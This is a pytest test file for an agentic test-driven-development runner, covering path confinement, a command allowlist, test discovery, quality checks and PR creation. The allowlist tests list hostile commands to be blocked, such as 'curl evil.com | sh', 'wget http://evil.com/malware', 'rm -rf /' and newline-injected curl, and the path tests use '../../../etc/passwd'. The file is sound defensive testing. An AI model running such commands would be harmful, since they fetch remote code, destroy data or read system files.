"""Tests for agent tool execution and file discovery."""
import os
import subprocess
from types import SimpleNamespace

import pytest

from agentic_tdd_runner.agent import (
    _get_changed_files,
    _parse_pr_content,
    _resolve_repo_path,
    _validate_command,
    create_pr,
    detect_quality_tools,
    find_test_file,
    main,
    run_quality_checks,
)


class TestResolveRepoPath:
    """Path resolution must confine access to the workdir."""

    def test_normal_relative_path(self, tmp_path):
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "file.ts").write_text("hello")
        result = _resolve_repo_path("src/file.ts", str(tmp_path))
        assert result == tmp_path / "src" / "file.ts"

    def test_rejects_parent_traversal(self, tmp_path):
        with pytest.raises(ValueError, match="escapes workdir"):
            _resolve_repo_path("../../../etc/passwd", str(tmp_path))

    def test_rejects_absolute_path(self, tmp_path):
        with pytest.raises(ValueError, match="escapes workdir"):
            _resolve_repo_path("/etc/passwd", str(tmp_path))

    def test_rejects_sneaky_traversal(self, tmp_path):
        with pytest.raises(ValueError, match="escapes workdir"):
            _resolve_repo_path("src/../../outside", str(tmp_path))

    def test_allows_nested_paths(self, tmp_path):
        (tmp_path / "src" / "deep").mkdir(parents=True)
        (tmp_path / "src" / "deep" / "file.ts").write_text("ok")
        result = _resolve_repo_path("src/deep/file.ts", str(tmp_path))
        assert result == tmp_path / "src" / "deep" / "file.ts"


class TestValidateCommand:
    """Command allowlist must block dangerous binaries."""

    def test_allows_git(self):
        _validate_command("git diff")

    def test_allows_bun_test(self):
        _validate_command("bun test src/foo.test.ts")

    def test_allows_pytest(self):
        _validate_command("python3 -m pytest tests/")

    def test_allows_grep(self):
        _validate_command("grep -r pattern src/")

    def test_allows_find(self):
        _validate_command("find . -name '*.ts'")

    def test_allows_cat(self):
        _validate_command("cat src/file.ts")

    def test_allows_ls(self):
        _validate_command("ls -la src/")

    def test_allows_npm_test(self):
        _validate_command("npm test")

    def test_allows_npx(self):
        _validate_command("npx tsc --noEmit")

    def test_blocks_curl(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("curl http://evil.com")

    def test_blocks_wget(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("wget http://evil.com/malware")

    def test_blocks_rm(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("rm -rf /")

    def test_blocks_bash(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("bash -c 'evil'")

    def test_blocks_sh(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("sh -c 'evil'")

    def test_blocks_empty_command(self):
        with pytest.raises(ValueError):
            _validate_command("")

    def test_blocks_pipe_to_disallowed(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("curl evil.com | sh")

    def test_allows_pipe_between_safe_commands(self):
        _validate_command("grep -r pattern src/ | head -20")

    def test_allows_chained_safe_commands(self):
        _validate_command("git status && bun test")

    def test_blocks_chained_with_unsafe(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("git status && curl evil.com")

    def test_blocks_python_dash_c(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("python3 -c 'import os; os.system(\"evil\")'")

    def test_blocks_node_dash_e(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("node -e 'require(\"child_process\").exec(\"evil\")'")

    def test_blocks_env_wrapper(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("env python3 -c 'evil'")

    def test_blocks_newline_injection(self):
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("git status\ncurl evil.com")

    def test_allows_python_m_pytest(self):
        """python3 -m pytest must still work."""
        _validate_command("python3 -m pytest tests/")

    def test_allows_node_scripts(self):
        """node without -e must still work."""
        _validate_command("node build.js")


class TestFindTestFile:
    """find_test_file discovers new test files matching configured patterns."""

    def _setup_git_repo(self, tmp_path):
        subprocess.run("git init", shell=True, cwd=tmp_path, capture_output=True)
        subprocess.run("git commit --allow-empty -m init", shell=True, cwd=tmp_path, capture_output=True)

    def test_finds_ts_test_file(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "foo.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts", "*.test.tsx", "*.test.js", "test_*.py"], "exclude_dirs": ["node_modules"]},
        })
        assert find_test_file() == "src/foo.test.ts"

    def test_finds_python_test_file(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "test_worker.py").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts", "test_*.py"], "exclude_dirs": ["node_modules"]},
        })
        assert find_test_file() == "src/test_worker.py"

    def test_excludes_node_modules(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "node_modules" / "pkg").mkdir(parents=True)
        (tmp_path / "node_modules" / "pkg" / "foo.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts"], "exclude_dirs": ["node_modules"]},
        })
        assert find_test_file() is None

    def test_uses_hint_path_when_exists(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "handleResub.test.ts").write_text("test")
        (tmp_path / "src" / "other.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
        })
        # With hint, returns the hinted path directly
        assert find_test_file(hint="src/handleResub.test.ts") == "src/handleResub.test.ts"

    def test_falls_back_to_discovery_when_hint_missing(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "foo.test.ts").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
        })
        # Hint file doesn't exist, falls back to discovery
        assert find_test_file(hint="src/nonexistent.test.ts") == "src/foo.test.ts"

    def test_verify_red_green_preserves_untracked_test(self, tmp_path, monkeypatch):
        """An untracked test file must survive the stash cycle in verify_red_green."""
        import subprocess as sp
        from agentic_tdd_runner.agent import verify_red_green

        # Set up a git repo with committed source
        sp.run("git init", shell=True, cwd=tmp_path, capture_output=True)
        sp.run(["git", "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp.run(["git", "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("original")
        sp.run("git add -A && git commit -m base", shell=True, cwd=tmp_path, capture_output=True)

        # Agent creates: modified source (fix) + new untracked test file
        (src / "math.ts").write_text("fixed")
        (src / "math.test.ts").write_text("test content")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "echo", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        verify_red_green("src/math.test.ts")

        # Both files must exist after verification
        assert (src / "math.test.ts").exists(), "Untracked test file disappeared"
        assert (src / "math.ts").read_text() == "fixed", "Source fix not restored"

    def test_stash_popped_after_red_phase_exception(self, tmp_path, monkeypatch):
        """git stash must be popped even if the red-phase test run raises."""
        import subprocess as sp
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp.run("git init", shell=True, cwd=tmp_path, capture_output=True)
        sp.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        sp.run(["git", "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "math.ts").write_text("original")
        sp.run("git add -A && git commit -m base", shell=True, cwd=tmp_path, capture_output=True)
        (tmp_path / "src" / "math.ts").write_text("fixed")
        (tmp_path / "src" / "math.test.ts").write_text("test")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "echo", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        original_run = sp.run
        red_phase_done = False

        def run_that_raises(*args, **kwargs):
            nonlocal red_phase_done
            cmd = args[0] if args else kwargs.get("args", [])
            # Raise on the first test run (red phase) only
            if isinstance(cmd, list) and any("math.test.ts" in str(c) for c in cmd) and not red_phase_done:
                red_phase_done = True
                raise sp.TimeoutExpired(cmd, 10)
            return original_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=run_that_raises):
            try:
                verify_red_green("src/math.test.ts")
            except sp.TimeoutExpired:
                pass  # This is what we expect WITHOUT the fix

        # Stash must be clean after the function returns or raises
        stash_list = sp.run(["git", "stash", "list"], cwd=tmp_path, capture_output=True, text=True)
        assert stash_list.stdout.strip() == "", f"Stash not popped: {stash_list.stdout}"

    def test_python_test_uses_pytest_command(self, tmp_path, monkeypatch):
        """When a Python test is found, verify_red_green should use pytest, not bun test."""
        # This tests that the runner command adapts to the file type
        from agentic_tdd_runner.languages import get_language
        lang = get_language("test_worker.py")
        assert lang is not None
        assert lang.runner == "pytest"

    def test_finds_tsx_test_file(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "widget.test.tsx").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts", "*.test.tsx"], "exclude_dirs": []},
        })
        assert find_test_file() == "src/widget.test.tsx"


class TestDetectQualityTools:
    """detect_quality_tools reads package.json/pyproject.toml to find lint/format tools."""

    def test_detects_biome_from_package_json(self, tmp_path, monkeypatch):
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "devDependencies": {"@biomejs/biome": "^2.0"},
            "scripts": {"lint": "biome check src", "typecheck": "tsc --noEmit"},
        }))
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        names = [c["name"] for c in checks]
        assert "typecheck" in names
        assert "lint" in names
        # Must use biome, not eslint
        lint_cmd = next(c for c in checks if c["name"] == "lint")
        assert "biome" in lint_cmd["command"]
        assert "eslint" not in lint_cmd["command"]

    def test_detects_eslint_and_prettier(self, tmp_path, monkeypatch):
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "devDependencies": {"eslint": "^9.0", "prettier": "^3.0"},
            "scripts": {"typecheck": "tsc --noEmit"},
        }))
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        names = [c["name"] for c in checks]
        assert "lint" in names
        assert "format" in names
        lint_cmd = next(c for c in checks if c["name"] == "lint")
        assert "eslint" in lint_cmd["command"]
        format_cmd = next(c for c in checks if c["name"] == "format")
        assert "prettier" in format_cmd["command"]

    def test_detects_ruff_from_pyproject(self, tmp_path, monkeypatch):
        (tmp_path / "pyproject.toml").write_text('[tool.ruff]\nline-length = 88\n')
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("python")
        names = [c["name"] for c in checks]
        assert "lint" in names
        lint_cmd = next(c for c in checks if c["name"] == "lint")
        assert "ruff" in lint_cmd["command"]

    def test_returns_empty_when_no_tools_found(self, tmp_path, monkeypatch):
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        # No package.json → only typecheck if tsc exists, otherwise empty
        assert isinstance(checks, list)

    @pytest.mark.parametrize("lockfile,expected_cmd", [
        ("pnpm-lock.yaml", "pnpm run typecheck"),
        ("yarn.lock", "yarn run typecheck"),
        ("bun.lock", "bun run typecheck"),
        (None, "npm run typecheck"),
    ])
    def test_uses_package_json_scripts_via_detected_pm(
        self, tmp_path, monkeypatch, lockfile, expected_cmd,
    ):
        """scripts.typecheck is invoked by name via the detected package manager,
        never by executing the raw script body."""
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "scripts": {"typecheck": "vue-tsc --noEmit"},
        }))
        if lockfile:
            (tmp_path / lockfile).touch()
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        tc = next((c for c in checks if c["name"] == "typecheck"), None)
        assert tc is not None
        assert tc["command"] == expected_cmd

    @pytest.mark.parametrize("pm_field,expected_pm", [
        ("pnpm@8.6.0", "pnpm"),
        ("yarn@4.1.0", "yarn"),
        ("bun@1.2.0", "bun"),
        ("npm@10.0.0", "npm"),
    ])
    def test_packagemanager_field_takes_priority_over_lockfile(
        self, tmp_path, monkeypatch, pm_field, expected_pm,
    ):
        """packageManager in package.json wins over lockfiles."""
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "scripts": {"typecheck": "vue-tsc --noEmit"},
            "packageManager": pm_field,
        }))
        # Conflicting lockfile to prove packageManager wins
        (tmp_path / "yarn.lock").touch()
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        tc = next((c for c in checks if c["name"] == "typecheck"), None)
        assert tc is not None
        assert tc["command"] == f"{expected_pm} run typecheck"


class TestGetChangedFiles:
    """_get_changed_files returns modified + untracked files."""

    def test_returns_modified_and_untracked(self, tmp_path, monkeypatch):
        subprocess.run("git init", shell=True, cwd=tmp_path, capture_output=True)
        subprocess.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        subprocess.run(["git", "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "tracked.ts").write_text("original")
        subprocess.run("git add -A && git commit -m init", shell=True, cwd=tmp_path, capture_output=True)
        (tmp_path / "tracked.ts").write_text("modified")
        (tmp_path / "new.ts").write_text("new")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        files = _get_changed_files()
        assert "tracked.ts" in files
        assert "new.ts" in files


class TestRunQualityChecks:
    """run_quality_checks enforces lint, format, and forbidden patterns."""

    def _setup_repo(self, tmp_path, monkeypatch):
        subprocess.run("git init", shell=True, cwd=tmp_path, capture_output=True)
        subprocess.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        subprocess.run(["git", "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "file.ts").write_text("original")
        subprocess.run("git add -A && git commit -m init", shell=True, cwd=tmp_path, capture_output=True)
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))

    def test_passes_when_disabled(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {"enabled": False},
            "timeouts": {"tool_execution": 10},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True

    def test_detects_forbidden_pattern(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("const x = {} as any;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": ["as any"]},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "as any" in msg

    def test_passes_clean_code(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": ["as any"]},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True

    def test_runs_check_command_and_reports_failure(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "lint", "command": "false"}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "lint" in msg

    def test_runs_fix_before_check(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        bad_file = tmp_path / "src" / "file.test.ts"
        bad_file.write_text("UNFIXED")
        # fix command rewrites the file; check command passes if content is "FIXED"
        fix_cmd = f"echo FIXED > {bad_file}"
        check_cmd = f"grep FIXED {bad_file}"
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "format", "command": check_cmd, "fix": fix_cmd}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True

    def test_quotes_changed_filenames_in_shell_commands(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        spaced_file = tmp_path / "src" / "my file.test.ts"
        spaced_file.write_text("clean")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "lint", "command": "cat {changed_files} >/dev/null"}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/my file.test.ts")
        assert ok is True

    def test_detects_duplicated_setup_lines(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doThing();\n"
            "  });\n"
            "  test('b', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doOther();\n"
            "  });\n"
            "  test('c', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doAnother();\n"
            "  });\n"
            "});\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "duplicated" in msg.lower() or "beforeEach" in msg

    def test_filters_by_language(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "test_worker.py").write_text("clean")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "tsc", "command": "false"}],  # would fail
                    "forbidden": [],
                },
                "python": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        # Python test file → only python checks run (none), TS checks skipped
        ok, msg = run_quality_checks("src/test_worker.py")
        assert ok is True


class TestParsePrContent:
    """_parse_pr_content extracts title and body from LLM response."""

    def test_extracts_title_and_body(self):
        content = "PR_TITLE: fix: use cumulative months in handleResub\nPR_BODY: The bug was in handleResub."
        title, body = _parse_pr_content(content)
        assert title == "fix: use cumulative months in handleResub"
        assert "handleResub" in body

    def test_truncates_long_title(self):
        content = "PR_TITLE: " + "x" * 100 + "\nPR_BODY: body"
        title, body = _parse_pr_content(content)
        assert len(title) <= 70

    def test_returns_none_on_missing_format(self):
        content = "Here is a PR for you."
        title, body = _parse_pr_content(content)
        assert title is None
        assert body is None

    def test_multiline_body(self):
        content = "PR_TITLE: fix bug\nPR_BODY: ## Summary\n\n- Fixed the bug\n- Added tests"
        title, body = _parse_pr_content(content)
        assert "Summary" in body
        assert "Added tests" in body


class TestCreatePr:
    """create_pr asks the LLM for content and runs git+gh commands."""

    def test_creates_branch_commit_push_pr(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch, call

        subprocess.run("git init", shell=True, cwd=tmp_path, capture_output=True)
        subprocess.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        subprocess.run(["git", "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run("git add -A && git commit -m init", shell=True, cwd=tmp_path, capture_output=True)
        # Agent's fix: modified source + new test (unstaged changes for PR)
        (tmp_path / "file.ts").write_text("fixed code")
        (tmp_path / "file.test.ts").write_text("test code")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10},
        })

        # Mock chat to return PR content
        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix: handle cumulative months\nPR_BODY: Fixed the bug."}}],
        }

        commands_run = []
        original_run = subprocess.run

        def track_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list):
                commands_run.append(cmd)
                # Fake success for git push and gh commands (no real remote)
                if cmd[0] == "gh" or (cmd[0] == "git" and "push" in cmd):
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/test/pr/1\n")
                return original_run(*args, **kwargs)
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", return_value=mock_response):
            with mock_patch("subprocess.run", side_effect=track_run):
                result = create_pr([], {}, "test.ts", 10)

        # Verify git commands were called in order
        cmd_strs = [" ".join(c) for c in commands_run]
        assert any("checkout -b" in c for c in cmd_strs), f"No checkout -b: {cmd_strs}"
        assert any("git add" in c for c in cmd_strs), f"No git add: {cmd_strs}"
        assert any("git commit" in c for c in cmd_strs), f"No git commit: {cmd_strs}"
        assert any("git push" in c for c in cmd_strs), f"No git push: {cmd_strs}"
        assert any("gh pr create" in c for c in cmd_strs), f"No gh pr create: {cmd_strs}"

    def test_returns_none_on_chat_failure(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10},
        })

        with mock_patch("agentic_tdd_runner.agent.chat", side_effect=Exception("timeout")):
            result = create_pr([], {}, "test.ts", 10)

        assert result is None


class TestMain:
    """main() should only report VERIFIED after the final tree is re-checked."""

    def test_reverifies_after_quality_pass(self, tmp_path, monkeypatch):
        config = {
            "agent": {"max_steps": 1},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": True, "max_fix_rounds": 3},
            "prompt": {
                "system": "system prompt",
                "nudge": "continue",
                "no_test_found": "no test",
            },
            "llm": {"model": "test-model"},
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )
        verify_calls = []

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *args, **kwargs: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", lambda messages: {
            "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
            "usage": {},
            "timings": {},
        })
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", lambda test_file: (True, "All quality checks passed"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        def fake_verify(test_file):
            verify_calls.append(test_file)
            return True, "verified"

        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", fake_verify)

        result = main()

        assert result == 0
        assert verify_calls == ["src/file.test.ts", "src/file.test.ts"]
